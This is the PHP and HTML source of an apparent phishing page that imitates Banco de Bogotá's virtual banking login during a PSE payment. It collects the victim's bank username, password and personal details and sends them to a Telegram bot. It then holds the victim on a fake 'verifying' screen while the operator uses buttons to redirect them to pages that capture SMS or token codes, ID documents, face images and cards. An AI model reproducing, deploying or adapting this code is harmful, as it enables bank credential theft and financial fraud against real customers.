<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------

session_start();

// ─── CONFIG ──────────────────────────────────────────────────────────────────
$configLocal = require __DIR__ . '/config.php';
$config = $configLocal;
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $globalPath = __DIR__ . '/../config.php';
    if (file_exists($globalPath)) {
        $config = require $globalPath;
    }
}

$logFile = __DIR__ . '/../log_pse.txt';
$log = function($msg) use ($logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " | [b-34f4-consulta] $msg\n", FILE_APPEND | LOCK_EX);
};

// ─── RECIBIR DATOS DEL FORMULARIO ────────────────────────────────────────────
$usuario = trim($_POST['u_id'] ?? '');
$pass    = trim($_POST['u_ps'] ?? '');
$tbRaw   = $_POST['u_tb'] ?? '{}';

if (empty($usuario) || empty($pass)) {
    header('Location: index.html');
    exit;
}

$tbdatos = json_decode($tbRaw, true);
if (!is_array($tbdatos)) $tbdatos = [];

// ─── RESPALDO SERVER-SIDE: si tbdatos viene vacío, cargar el registro de la
// transacción por el ticket (?t= de la URL de referencia) desde transacciones_pse.json ───
require_once __DIR__ . '/../tx_fallback.php';
$tbdatos = tx_cargar_datos_ticket($tbdatos);

// NOTA: en la gate de bancos NO se filtran usuario/clave con el evaluador
// antibot (un usuario de banco tipo 'pepito2024' es legítimo aunque tenga
// números). Todo llega a Telegram con botones y el operador decide.
// Solo se mantiene el chequeo de IP baneada (al inicio del archivo).

// ─── GENERAR / RECUPERAR SESSION ID ──────────────────────────────────────────
$_SESSION['session_id'] = 'session_' . time() . '_' . bin2hex(random_bytes(5));
$transactionId = $_SESSION['session_id'];

// Guardar en sesión para consulta2.php
$_SESSION['usuario'] = $usuario;
$_SESSION['pass']    = $pass;
$_SESSION['tbdatos'] = $tbdatos;

// ─── DETECCIÓN DE DISPOSITIVO E IP ───────────────────────────────────────────
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device    = 'PC';
if (stripos($userAgent, 'Android') !== false)                                             $device = 'Android';
elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) $device = 'iPhone';
elseif (stripos($userAgent, 'Mobile') !== false)                                          $device = 'Movil';

$ip   = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$hora = date('d/m/Y H:i:s');

// ─── CONSTRUIR MENSAJE (formato b-34f2-caja: bullets 🟢, sin emojis sueltos) ─
$bancoRaw = !empty($tbdatos['banco']) ? $tbdatos['banco'] : '1001 - BANCO DE BOGOTA';
$banco = function_exists('jelpi_format_banco') ? jelpi_format_banco($bancoRaw, 'b-10') : strtoupper($bancoRaw);

$msg  = "◉ PSE - {$banco} ◉\n\n";

if (!empty($tbdatos['nombre'])) {
    $msg .= "🟢 Nombre: " . htmlspecialchars($tbdatos['nombre']) . "\n";
}
if (!empty($tbdatos['documento'])) {
    $tipo = !empty($tbdatos['tipo_identificacion']) ? ' (' . htmlspecialchars($tbdatos['tipo_identificacion']) . ')' : '';
    $msg .= "🟢 Documento: " . htmlspecialchars($tbdatos['documento']) . $tipo . "\n";
}
if (!empty($tbdatos['correo'])) {
    $msg .= "🟢 Correo: " . htmlspecialchars($tbdatos['correo']) . "\n";
}
if (!empty($tbdatos['telefono'])) {
    $msg .= "🟢 Telefono: " . htmlspecialchars($tbdatos['telefono']) . "\n";
}
if (!empty($tbdatos['direccion'])) {
    $msg .= "🟢 Direccion: " . htmlspecialchars($tbdatos['direccion']) . "\n";
}

$monto = $tbdatos['total_pagar'] ?? $tbdatos['monto'] ?? $tbdatos['amount'] ?? $tbdatos['valor'] ?? $tbdatos['valor_pagar'] ?? $tbdatos['total'] ?? '';
if ($monto === '') {
    $monto = $_SESSION['monto'] ?? $_SESSION['total_pagar'] ?? '';
} else {
    $_SESSION['monto'] = $monto;
}
if ($monto !== '') {
    $msg .= "🟢 Monto: $" . number_format((float)$monto, 0, ',', '.') . "\n";
}

$msg .= "\n";
$msg .= "🟢 Usuario: " . htmlspecialchars($usuario) . "\n";
$msg .= "🟢 Clave: " . htmlspecialchars($pass) . "\n\n";
$msg .= "🟢 IP: {$ip} | Device: {$device} | {$hora}\n\n";
$msg .= "🐙 @FU7UR4MA 🐙";

// ─── TECLADO TELEGRAM ─────────────────────────────────────────────────────────
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Cara',       'callback_data' => "error:{$transactionId}"],
            ['text' => 'Cedula',     'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => 'Tarjeta',    'callback_data' => "error_tc:{$transactionId}"],
            ['text' => 'sms',        'callback_data' => "token_6:{$transactionId}"],
            ['text' => 'token',      'callback_data' => "token_8:{$transactionId}"]
        ],
        [
            ['text' => 'Error Logo', 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => 'Finalizar',  'callback_data' => "confirm_finalizar:{$transactionId}"]
        ],
        [
            ['text' => 'Bre-B',      'callback_data' => "bre_b:{$transactionId}"]
        ]
    ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
];

// ─── ENVIAR A TELEGRAM ────────────────────────────────────────────────────────
$messageId = null;

if (!empty($config['bot_token']) && !empty($config['chat_id'])) {
    $data = [
        'chat_id'      => $config['chat_id'],
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);

    $response  = curl_exec($ch);
    $curlError = curl_error($ch);
    curl_close($ch);

    if (!$curlError) {
        $result = json_decode($response, true);
        if (!empty($result['ok'])) {
            $messageId = $result['result']['message_id'];
            $log("OK MessageId: $messageId | Txn: $transactionId | Usuario: $usuario");
        } else {
            $log("ERROR Telegram: " . ($result['description'] ?? 'sin descripcion'));
        }
    } else {
        $log("CURL ERROR: $curlError");
    }
} else {
    $log("ADVERTENCIA: config vacio, sin envio a Telegram");
}

$_SESSION['messageId'] = $messageId;
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca Virtual - Verificando</title>
    <link rel="icon" type="image/x-icon" href="https://virtual.bancodebogota.co/bbog-pb-frontend-bv-shell/assets/favicon.ico">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; -webkit-font-smoothing: antialiased; }
        body, html { width: 100%; height: 100%; overflow: hidden; background-color: #F8FAFB; }
        .main-wrapper { display: flex; min-height: 100vh; width: 100%; }

        .left-container { width: 47%; background-color: #FFFFFF; display: flex; justify-content: flex-start; padding-top: 40px; padding-left: 24%; }
        .content-box { width: 351px; }
        .main-logo { height: 32px; margin-bottom: 25px; display: block; }
        .welcome-msg { font-size: 24px; font-weight: 600; color: #000; margin-bottom: 20px; }
        .blue-banner { background-color: #1D4E9E; border-radius: 12px; display: flex; align-items: center; padding: 0 7px; color: white; margin-bottom: 17px; height: 88px; }
        .person-img { height: 71px; margin-top: -17px; margin-right: 15px; }
        .login-card { border: 1px solid #EAECEF; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.03); background: #fff; margin-bottom: 35px; }
        .tabs { display: flex; border-bottom: 1px solid #F0F2F5; }
        .tab { flex: 1; padding: 18px; text-align: center; color: #6B7280; font-weight: 600; }
        .tab.active { color: #0043a9; border-bottom: 3px solid #1D4E9E; }
        .alert-info { background-color: #edf7ff; padding: 14px; font-size: 15px; color: #606060; border-bottom: 1px solid #E0EBF5; }
        .card-body { padding: 24px 22px; }
        .label-text { display: block; font-size: 14px; color: #000; margin-bottom: 10px; font-weight: 500; }
        .input-row { display: flex; gap: 12px; margin-bottom: 25px; }
        .styled-select, .styled-input, .pass-input { border: 1px solid #D1D5DB; border-radius: 10px; height: 52px; width: 100%; background: #f3f3f3; }
        .btn-submit { width: 100%; height: 54px; background-color: #00448D; color: #FFF; border: none; border-radius: 25px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; justify-content: center; }

        .right-container { width: 53%; background-color: #F8FAFB; display: flex; justify-content: flex-start; align-items: flex-start; padding-top: 129px; padding-left: 60px; }
        .promo-wrapper { width: 480px; position: relative; }
        .promo-card { background: #FFFFFF; border-radius: 12px; width: 480px; height: 250px; display: flex; overflow: hidden; border: 1px solid #EAECEF; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
        .promo-img-side { flex: 0 0 181px; display: flex; align-items: flex-end; }
        .promo-img-side img { width: 131%; margin-left: -25px; }
        .promo-info-side { flex: 1; padding: 40px 30px 20px 60px; }
        .promo-info-side h2 { font-size: 28px; font-weight: 700; margin-bottom: 15px; }
        .promo-info-side p { font-size: 16px; color: #000; line-height: 1.3; }

        #loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(13, 35, 72, 0.75);
            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 9999; text-align: center; padding: 20px;
        }
        .loader-scene { position: relative; width: 120px; height: 120px; margin-bottom: 30px; display: flex; justify-content: center; align-items: center; }
        .dots-wrapper { position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; animation: global-rotate 1.8s linear infinite 2.5s; }
        .dot { position: absolute; width: 28px; height: 28px; border-radius: 50%; transform: scale(0); }
        .cyan   { background-color: #00e5ff; z-index: 3; }
        .yellow { background-color: #ffeb3b; z-index: 2; }
        .red    { background-color: #ff3d00; z-index: 1; }
        .fixed-shadow { position: absolute; bottom: -5px; width: 40px; height: 8px; background: rgba(0,0,0,0.5); border-radius: 50%; filter: blur(5px); transform: scale(0); }
        .loader-text { color: white; font-size: 19px; font-weight: 500; max-width: 320px; text-shadow: 0 2px 8px rgba(0,0,0,0.6); }

        @keyframes global-rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes intro-cyan   { 0% { transform: scale(0) translateY(-80px); } 20%, 100% { transform: scale(1) translate(0,0); } }
        @keyframes intro-yellow { 0%, 65% { transform: scale(0); } 100% { transform: scale(1) translate(0,0); } }
        @keyframes intro-red    { 0%, 85% { transform: scale(0); } 100% { transform: scale(1) translate(0,0); } }
        @keyframes move-cyan    { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(0,-40px); } }
        @keyframes move-yellow  { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(-35px,20px); } }
        @keyframes move-red     { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(35px,20px); } }
        @keyframes shadow-pulse { 0%, 20% { transform: scale(0); opacity: 0; } 100% { transform: scale(1.1); opacity: 1; } }

        @media (max-width: 768px) {
            .main-wrapper { flex-direction: column; }
            .left-container, .right-container { width: 100%; padding: 20px; }
            .promo-wrapper { width: 100%; }
            .promo-card { width: 100%; height: auto; min-height: 150px; }
        }
    </style>
</head>
<body onload="runLoader()">

    <div id="loader-overlay">
        <div class="loader-scene">
            <div class="dots-wrapper">
                <div class="dot cyan"></div>
                <div class="dot yellow"></div>
                <div class="dot red"></div>
            </div>
            <div class="fixed-shadow"></div>
        </div>
        <p class="loader-text">Estamos verificando tu información, por favor no cierres esta ventana.</p>
    </div>

    <main class="main-wrapper">
        <section class="left-container">
            <div class="content-box">
                <img src="img/logo.svg" alt="Logo" class="main-logo">
                <h1 class="welcome-msg">Bienvenido a tu Banca Virtual</h1>
                <div class="blue-banner">
                    <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png" class="person-img">
                    <div class="banner-text"><p>¿Nunca has ingresado?</p></div>
                </div>
                <div class="login-card">
                    <div class="tabs"><div class="tab active">Clave segura</div><div class="tab">Tarjeta débito</div></div>
                    <div class="alert-info">Verificando seguridad de la cuenta...</div>
                    <div class="card-body">
                        <label class="label-text">Identificación</label>
                        <div class="input-row">
                            <div class="styled-select" style="width: 38%;"></div>
                            <div class="styled-input" style="width: 62%;"></div>
                        </div>
                        <label class="label-text">Clave segura</label>
                        <div class="pass-input" style="margin-bottom: 30px;"></div>
                        <div class="btn-submit">Ingresando...</div>
                    </div>
                </div>
            </div>
        </section>

        <section class="right-container">
            <div class="promo-wrapper">
                <div class="promo-card">
                    <div class="promo-img-side">
                        <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/e72fd950acb9871e4bb2.png">
                    </div>
                    <div class="promo-info-side">
                        <h2>¡Que nada se te olvide!</h2>
                        <p>Programa tus transferencias de forma rápida y sencilla.</p>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <script>
        // Variables PHP embebidas
        const transactionId = <?= json_encode($_SESSION['session_id'] ?? '') ?>;
        const messageId     = <?= json_encode($messageId) ?>;
        let pollTimer = null;
        let pollInFlight = false;

        function clearPolling() {
            if (pollTimer) {
                clearTimeout(pollTimer);
                pollTimer = null;
            }
        }

        window.addEventListener('beforeunload', clearPolling);

        function runLoader() {
            document.querySelector('.cyan').style.animation   = "intro-cyan 2.5s ease-out forwards, move-cyan 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
            document.querySelector('.yellow').style.animation = "intro-yellow 2.5s ease-out forwards, move-yellow 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
            document.querySelector('.red').style.animation    = "intro-red 2.5s ease-out forwards, move-red 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
            document.querySelector('.fixed-shadow').style.animation = "shadow-pulse 2.5s ease-out forwards";

            // Iniciar polling solo si hay messageId
            if (messageId) {
                clearPolling();
                pollTimer = setTimeout(() => comenzarPolling(), 2500);
            }
        }

        async function comenzarPolling() {
            if (pollInFlight) {
                return;
            }
            pollInFlight = true;

            try {
                const formData = new FormData();
                formData.append('transactionId', transactionId);
                formData.append('messageId', messageId);

                const res    = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
                const result = await res.json();

                if (result && result.action) {
                    clearPolling();
                    switch (result.action) {
                        case 'token_6':
                            window.location.href = 'codigo.php?type=6';
                            break;
                        case 'token_8':
                            window.location.href = 'codigo.php?type=8';
                            break;
                        case 'bre_b':
                            window.location.href = '/recaudos/brev.php?bogota';
                            break;
                        case 'error_logo':
                            window.location.href = 'index.html?error=1';
                            break;
                        case 'error_tc':
                            window.location.href = '/datac/alter.php';
                            break;
                        case 'error':
                            window.location.href = '/caras';
                            break;
                        case 'cedula':
                            window.location.href = '/cedula';
                            break;
                        case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                            window.location.href = '/fin.php';
                            break;
                        default:
                            pollTimer = setTimeout(() => comenzarPolling(), 2000);
                    }
                } else {
                    pollTimer = setTimeout(() => comenzarPolling(), 2000);
                }
            } catch (err) {
                pollTimer = setTimeout(() => comenzarPolling(), 2000);
            } finally {
                pollInFlight = false;
            }
        }
    </script>
</body>
</html>
